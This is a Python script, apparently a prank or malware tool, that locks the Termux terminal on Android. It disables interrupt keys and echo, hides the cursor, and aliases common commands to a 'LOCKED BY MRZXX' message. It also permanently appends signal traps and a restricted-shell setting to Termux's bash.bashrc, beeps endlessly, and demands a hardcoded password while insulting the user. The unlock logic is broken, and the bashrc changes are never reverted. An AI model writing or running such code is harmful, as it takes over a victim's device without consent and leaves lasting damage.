import os
import sys
import time
import threading

PASSWORD = "mrzxx"

class TermuxLocker:
    def __init__(self):
        self.locked = True
        self.attempts = 0
        
    def destroy_controls(self):
        os.system("stty -echo raw")
        os.system("stty intr undef quit undef susp undef stop undef")
        
        with open("/dev/tty", "w") as tty:
            tty.write("\033[?25l")
        
        os.system("""
        alias ls='echo "LOCKED BY MRZXX"'
        alias cd='echo "LOCKED BY MRZXX"'
        alias cat='echo "LOCKED BY MRZXX"'
        alias nano='echo "LOCKED BY MRZXX"'
        alias vim='echo "LOCKED BY MRZXX"'
        alias exit='echo "LOCKED BY MRZXX"'
        alias bash='echo "LOCKED BY MRZXX"'
        alias sh='echo "LOCKED BY MRZXX"'
        alias python='echo "LOCKED BY MRZXX"'
        alias clear='echo "LOCKED BY MRZXX"'
        alias pwd='echo "LOCKED BY MRZXX"'
        """)
        
        with open("/data/data/com.termux/files/usr/etc/bash.bashrc", "a") as f:
            f.write(f"""
trap '' 1 2 3 15 20
PS1='LOCKED_BY_MRZXX$ '
export PS1
alias exit='echo LOCKED'
alias bash='echo LOCKED'
shopt -s restricted_shell
""")
    
    def flash_banner(self):
        banner = """
███████╗██╗░░░░░░█████╗░░█████╗░██╗░░██╗███████╗██████╗░
██╔════╝██║░░░░░██╔══██╗██╔══██╗██║░██╔╝██╔════╝██╔══██╗
█████╗░░██║░░░░░██║░░██║██║░░██║█████═╝░█████╗░░██████╔╝
██╔══╝░░██║░░░░░██║░░██║██║░░██║██╔═██╗░██╔══╝░░██╔══██╗
███████╗███████╗╚█████╔╝╚█████╔╝██║░╚██╗███████╗██║░░██║
╚══════╝╚══════╝░╚════╝░░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
                
            wkwkwk LOCKED BY MRZXX
            
    """
        os.system("clear")
        sys.stdout.write(banner)
        sys.stdout.flush()
    
    def annoying_loop(self):
        while self.locked:
            os.system("echo '\a'")
            time.sleep(0.5)
    
    def check_lock(self):
        with open("/data/data/com.termux/files/home/.lockfile", "w") as f:
            f.write("LOCKED")
        
        while True:
            try:
                with open("/data/data/com.termux/files/home/.lockfile", "r") as f:
                    if f.read().strip() == "UNLOCK":
                        self.locked = False
                        break
            except:
                pass
            time.sleep(1)
    
    def start_lock(self):
        self.destroy_controls()
        self.flash_banner()
        
        annoy_thread = threading.Thread(target=self.annoying_loop)
        annoy_thread.daemon = True
        annoy_thread.start()
        
        lock_thread = threading.Thread(target=self.check_lock)
        lock_thread.daemon = True
        lock_thread.start()
        
        print("\n\n[INPUT PASSWORD]: ", end="")
        
        while self.locked:
            try:
                inp = sys.stdin.read(1)
                if inp:
                    if inp == "\n":
                        if self.attempts == PASSWORD:
                            with open("/data/data/com.termux/files/home/.lockfile", "w") as f:
                                f.write("UNLOCK")
                            self.locked = False
                            break
                        else:
                            print("\nSALAH BANGSAT! COBA LAGI")
                            print("[INPUT PASSWORD]: ", end="")
                            self.attempts = ""
                    else:
                        self.attempts += inp
                        sys.stdout.write("*")
                        sys.stdout.flush()
            except:
                pass
        
        os.system("stty echo -raw sane")
        os.system("rm -f /data/data/com.termux/files/home/.lockfile")
        print("\n[UNLOCKED]")
        os._exit(0)

if __name__ == "__main__":
    locker = TermuxLocker()
    locker.start_lock()
